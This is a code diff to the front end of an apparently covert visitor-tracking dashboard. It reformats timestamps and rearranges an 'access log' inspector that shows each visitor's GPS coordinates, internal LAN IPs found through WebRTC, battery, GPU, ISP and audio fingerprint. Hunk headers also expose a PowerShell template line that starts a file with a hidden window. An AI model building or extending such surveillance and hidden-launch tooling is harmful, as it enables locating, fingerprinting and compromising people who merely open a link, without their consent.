@@ -175,14 +175,14 @@ const RunApp = (() => {
             const date = parseServerTime(utcStr);
             if (isNaN(date.getTime())) return String(utcStr);
 
-            const pad = n => String(n).padStart(2, '0');
-            const y = date.getFullYear();
-            const m = pad(date.getMonth() + 1);
-            const d = pad(date.getDate());
-            const hh = pad(date.getHours());
-            const mm = pad(date.getMinutes());
-            const ss = pad(date.getSeconds());
-            return `${y}-${m}-${d} ${hh}:${mm}:${ss}`;
+            return date.toLocaleString(undefined, {
+                year: 'numeric',
+                month: 'numeric',
+                day: 'numeric',
+                hour: 'numeric',
+                minute: '2-digit',
+                second: '2-digit'
+            });
         } catch {
             return String(utcStr);
         }
@@ -2060,8 +2060,13 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         if (!timestamp) return '—';
         try {
             const d = new Date(timestamp * 1000);
-            const pad = n => String(n).padStart(2, '0');
-            return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}`;
+            return d.toLocaleString(undefined, {
+                year: 'numeric',
+                month: 'numeric',
+                day: 'numeric',
+                hour: 'numeric',
+                minute: '2-digit'
+            });
         } catch {
             return '—';
         }
@@ -3943,10 +3948,19 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
 
             const cleanGpu = getCleanGpuName(log.gpu);
             const lanIp = (detailsObj.webrtcIps && detailsObj.webrtcIps.length > 0) ? detailsObj.webrtcIps[0] : '';
+            const lanIpDisplay = (detailsObj.webrtcIps && detailsObj.webrtcIps.length > 0)
+                ? detailsObj.webrtcIps.join(', ')
+                : (lanIp || 'None');
             const modelName = detailsObj.clientHints?.model || '';
             const asStr = detailsObj.as ? detailsObj.as.split(' ')[0] : '';
             const asClean = detailsObj.as ? detailsObj.as.split(' ')[0] : '-';
             const orgDisplay = (detailsObj.org && detailsObj.org !== log.isp) ? detailsObj.org : (log.isp || '-');
+
+            // Format battery string
+            let batteryDisplay = 'Unavailable';
+            if (detailsObj.battery && detailsObj.battery.level) {
+                batteryDisplay = `${detailsObj.battery.level}${detailsObj.battery.charging ? ' ⚡' : ''}`;
+            }
 
             // Format audio pipeline info cleanly
             let audioDisplay = '-';
@@ -3997,72 +4011,41 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
                         ${asStr ? `<span class="access-log-geo-as">• ${escapeHtml(asStr)}</span>` : ''}
                     </div>
 
-                    <!-- Deep-Dive Forensic Inspector (Contains GPS, Hardware Pills & Telemetry) -->
+                    <!-- Deep-Dive Forensic Inspector (Organized 3-Column Specifications) -->
                     <div class="access-log-expanded-panel" id="log-detail-${log.id}" style="display: none;">
-                        ${hasGps ? `
-                        <!-- Verified High-Accuracy GPS Row -->
-                        <div class="access-log-gps-row" style="margin-bottom: 8px;">
-                            <span class="access-log-gps-badge" title="High-accuracy GPS sensor coordinates">
-                                <i class="bi bi-crosshair"></i> GPS: ${escapeHtml(gpsDisplay)}
-                            </span>
-                            <a class="access-log-maps-btn" href="${mapsUrl}" target="_blank" rel="noreferrer" title="Open GPS Location in Google Maps">
-                                <i class="bi bi-geo-alt-fill"></i> View Map
-                            </a>
-                        </div>
-                        ` : ''}
-
-                        <!-- Quick-Scan Pills Row -->
-                        <div class="access-log-pills-row" style="margin-bottom: 12px;">
-                            <span class="access-log-pill" title="Screen resolution">
-                                <i class="bi bi-display"></i> ${escapeHtml(log.screen || '-')}
-                            </span>
-                            <span class="access-log-pill" title="Hardware concurrency & memory">
-                                <i class="bi bi-cpu"></i> ${escapeHtml(log.hardware || '-')}
-                            </span>
-                            <span class="access-log-pill" title="Graphics: ${escapeHtml(log.gpu || '')}">
-                                <i class="bi bi-gpu-card"></i> ${escapeHtml(cleanGpu)}
-                            </span>
-                            ${detailsObj.battery ? `
-                            <span class="access-log-pill" title="Device Battery">
-                                <i class="bi bi-battery-charging"></i> ${escapeHtml(detailsObj.battery.level || '')} ${detailsObj.battery.charging ? '⚡' : ''}
-                            </span>
-                            ` : ''}
-                            ${lanIp ? `
-                            <span class="access-log-pill" title="LAN / Discovered Candidate IP">
-                                <i class="bi bi-router"></i> ${escapeHtml(lanIp)}
-                            </span>
-                            ` : ''}
-                            ${modelName ? `
-                            <span class="access-log-pill" title="Device Model">
-                                <i class="bi bi-phone"></i> ${escapeHtml(modelName)}
-                            </span>
-                            ` : ''}
-                        </div>
                         <div class="access-log-deep-grid">
                             <!-- Col 1: Hardware & Display Specs -->
                             <div class="access-log-deep-col">
                                 <div class="access-log-deep-header"><i class="bi bi-motherboard"></i> Hardware & Display</div>
+                                <div class="access-log-deep-row"><span>Screen:</span> <code>${escapeHtml(log.screen || '-')}</code></div>
                                 <div class="access-log-deep-row"><span>Viewport:</span> <code>${escapeHtml(detailsObj.viewport || '-')}</code></div>
+                                <div class="access-log-deep-row"><span>CPU & RAM:</span> <code>${escapeHtml(log.hardware || '-')}</code></div>
+                                <div class="access-log-deep-row"><span>GPU Chipset:</span> <code>${escapeHtml(cleanGpu)}</code></div>
+                                <div class="access-log-deep-row"><span>Raw GPU:</span> <code class="truncate-code" title="${escapeHtml(log.gpu || '')}">${escapeHtml(log.gpu || '-')}</code></div>
+                                <div class="access-log-deep-row"><span>Battery:</span> <code>${escapeHtml(batteryDisplay)}</code></div>
+                                <div class="access-log-deep-row"><span>Device Model:</span> <code>${escapeHtml(modelName || (log.device || 'Desktop / PC'))}</code></div>
                                 <div class="access-log-deep-row"><span>Color / HDR:</span> <code>${detailsObj.isHdr ? 'HDR Active' : 'SDR'}${detailsObj.colorGamut ? ` (${escapeHtml(detailsObj.colorGamut)})` : ''}</code></div>
                                 <div class="access-log-deep-row"><span>Orientation:</span> <code>${escapeHtml(detailsObj.orientation || '-')}</code></div>
                                 <div class="access-log-deep-row"><span>Touch Support:</span> <code>${detailsObj.touchSupport ? 'Touch Enabled' : 'Mouse / No Touch'}</code></div>
-                                <div class="access-log-deep-row"><span>Raw GPU:</span> <code class="truncate-code" title="${escapeHtml(log.gpu || '')}">${escapeHtml(log.gpu || '-')}</code></div>
                             </div>
 
                             <!-- Col 2: Network & Carrier Intelligence -->
                             <div class="access-log-deep-col">
                                 <div class="access-log-deep-header"><i class="bi bi-diagram-3"></i> Network & Carrier</div>
                                 <div class="access-log-deep-row"><span>ISP:</span> <code title="${escapeHtml(log.isp || '')}">${escapeHtml(log.isp || '-')}</code></div>
-                                <div class="access-log-deep-row"><span>Autonomous System:</span> <code title="${escapeHtml(detailsObj.as || '')}">${escapeHtml(asClean)}</code></div>
+                                <div class="access-log-deep-row"><span>AS Number:</span> <code title="${escapeHtml(detailsObj.as || '')}">${escapeHtml(asClean)}</code></div>
                                 <div class="access-log-deep-row"><span>Organization:</span> <code title="${escapeHtml(orgDisplay)}">${escapeHtml(orgDisplay)}</code></div>
-                                <div class="access-log-deep-row"><span>Downlink / RTT:</span> <code>${detailsObj.connection ? `${escapeHtml(detailsObj.connection.effectiveType || '')} ${escapeHtml(detailsObj.connection.downlink || '')} (${escapeHtml(detailsObj.connection.rtt || '-')})` : '-'}</code></div>
-                                <div class="access-log-deep-row"><span>Discovered LAN IPs:</span> <code>${detailsObj.webrtcIps && detailsObj.webrtcIps.length ? escapeHtml(detailsObj.webrtcIps.join(', ')) : 'None'}</code></div>
                                 <div class="access-log-deep-row"><span>Net Type:</span> <code>${escapeHtml(netTypeLabel)}</code></div>
+                                <div class="access-log-deep-row"><span>Downlink / RTT:</span> <code>${detailsObj.connection ? `${escapeHtml(detailsObj.connection.effectiveType || '')} ${escapeHtml(detailsObj.connection.downlink || '')} (${escapeHtml(detailsObj.connection.rtt || '-')})` : '-'}</code></div>
+                                <div class="access-log-deep-row"><span>Discovered LAN:</span> <code title="${escapeHtml(lanIpDisplay)}">${escapeHtml(lanIpDisplay)}</code></div>
+                                <div class="access-log-deep-row"><span>GPS Sensor:</span> <code>${hasGps ? escapeHtml(gpsDisplay) : 'Unavailable'}</code></div>
+                                <div class="access-log-deep-row"><span>Location:</span> <code title="${escapeHtml(locationStr)}">${escapeHtml(locationStr)}</code></div>
                             </div>
 
                             <!-- Col 3: Browser & Security Environment -->
                             <div class="access-log-deep-col">
                                 <div class="access-log-deep-header"><i class="bi bi-shield-lock"></i> Environment & Audio</div>
+                                <div class="access-log-deep-row"><span>Local Time:</span> <code>${escapeHtml(localTimeStr)}</code></div>
                                 <div class="access-log-deep-row"><span>Timezone:</span> <code>${escapeHtml(log.timezone || '-')}</code></div>
                                 <div class="access-log-deep-row"><span>Languages:</span> <code>${escapeHtml(log.language || '-')}</code></div>
                                 <div class="access-log-deep-row"><span>Audio Pipeline:</span> <code>${escapeHtml(audioDisplay)}</code></div>
